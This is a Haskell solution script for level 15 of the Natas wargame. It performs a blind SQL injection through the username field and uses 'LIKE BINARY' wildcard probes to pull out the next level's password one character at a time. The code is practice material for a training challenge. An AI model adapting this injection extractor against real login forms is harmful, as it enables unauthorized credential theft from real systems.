{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas15 where

import           Control.Monad       (filterM)

import           Data.List           (intersperse)
import           Data.Text           (breakOn, pack)
import           Data.Text.Encoding  (encodeUtf8)

import           Control.Monad.Loops (firstM)
import           Network.Wreq        (partBS)

import           Natas.Natas

solution :: Solution
solution = do
  presentChars <- filterM (attemptPassword . placeAnywhere) validChars
  print presentChars
  match <- buildPassword presentChars ""
  pure $ fmap pack match

buildPassword :: String -> String -> IO (Maybe String)
buildPassword avail curr = do
  let placeEnd x = curr ++ pure x
      fuzzyAttempt password = attemptPassword (password ++ "%")
  matches <- (firstM fuzzyAttempt . fmap placeEnd) avail
  case matches of
    Nothing -> pure (pure curr)
    Just match -> do
      print match
      buildPassword avail match

attemptPassword :: String -> IO Bool
attemptPassword guess = do
  let sqlInject =
        (encodeUtf8 . pack . concat)
          ["natas16\" and password LIKE BINARY \"", guess, "\" -- "]
      form = partBS "username" sqlInject
  req <- postLevel 15 form
  let body = reqBody req
  pure $
    case breakOn "exists" body of
      (_match, "") -> False
      _            -> True

placeAnywhere :: Char -> String
placeAnywhere x = intersperse x "%%"

validChars :: String
validChars = ['0' .. '9'] ++ ['A' .. 'Z'] ++ ['a' .. 'z']
